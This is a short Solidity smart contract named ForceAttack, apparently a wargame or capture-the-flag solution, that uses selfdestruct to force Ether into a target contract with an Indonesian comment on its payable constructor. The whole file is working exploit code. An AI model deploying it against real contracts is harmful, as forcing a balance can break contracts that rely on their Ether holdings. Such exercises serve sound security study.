// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    
    constructor() payable {
        // payable agar bisa terima ETH saat deploy
    }

    function attack(address payable _target) public {
        selfdestruct(_target);
    }
}